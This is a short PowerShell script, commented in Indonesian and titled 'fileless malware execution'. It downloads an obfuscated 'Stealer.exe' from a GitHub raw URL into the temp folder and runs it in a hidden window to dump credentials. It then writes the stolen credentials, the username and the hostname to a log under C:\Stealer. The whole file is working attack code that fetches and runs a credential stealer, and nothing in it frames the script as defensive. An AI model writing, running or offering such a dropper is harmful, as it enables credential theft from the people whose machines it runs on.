# ========================================
# FILELESS MALWARE EXECUTION
# ========================================

# 1. Buat folder C:\Stealer kalo belum ada
$logDir = "C:\Stealer"
if (!(Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }

# 2. Jalankan Stealer.exe (sebagai proses tersembunyi)
$stealerPath = "$env:TEMP\Stealer.exe"

# Download Stealer.exe kalo belum ada
if (!(Test-Path $stealerPath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dailam008/stealer/main/Stealer_obfuscated.exe" -OutFile $stealerPath
}

# Jalankan Stealer.exe (tunggu 15 detik biar selesai dump)
Start-Process -FilePath $stealerPath -WindowStyle Hidden -Wait

# 3. Baca hasil dump credential
$credFile = "$logDir\stolen_data.txt"
$credContent = ""
if (Test-Path $credFile) {
    $credContent = Get-Content -Path $credFile -Raw -ErrorAction SilentlyContinue
}

# 4. Tulis log GABUNGAN (Header + Credential)
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$logFile = "$logDir\payload_log.txt"
$logContent = @"
========================================
 FILELESS MALWARE EXECUTION
========================================
[+] Waktu: $timestamp
[+] User: $env:USERNAME
[+] Hostname: $env:COMPUTERNAME
[+] Payload berhasil dijalankan secara fileless!

[+] HASIL CREDENTIAL DUMP:
$credContent
========================================
"@

# Tulis log ke file
$logContent | Out-File -FilePath $logFile -Encoding utf8
